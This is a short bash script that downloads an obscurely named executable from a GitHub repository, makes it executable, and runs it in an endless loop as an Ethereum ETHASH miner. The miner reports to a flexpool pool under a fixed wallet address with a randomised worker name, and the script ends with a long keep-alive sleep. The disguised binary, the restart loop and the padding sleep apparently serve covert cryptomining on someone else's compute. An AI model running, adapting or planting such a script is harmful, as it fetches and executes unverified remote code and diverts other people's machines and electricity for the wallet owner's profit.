#!/bin/bash
POOL=eth-us-west.flexpool.io:4444
WALLET=0xe91e1e7383f091ec7686285fca0688a40b7a38d7
WORKER=$(echo $(shuf -i 10-40 -n 1)-Flavio)
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
sleep 5
done
sleep 999999999
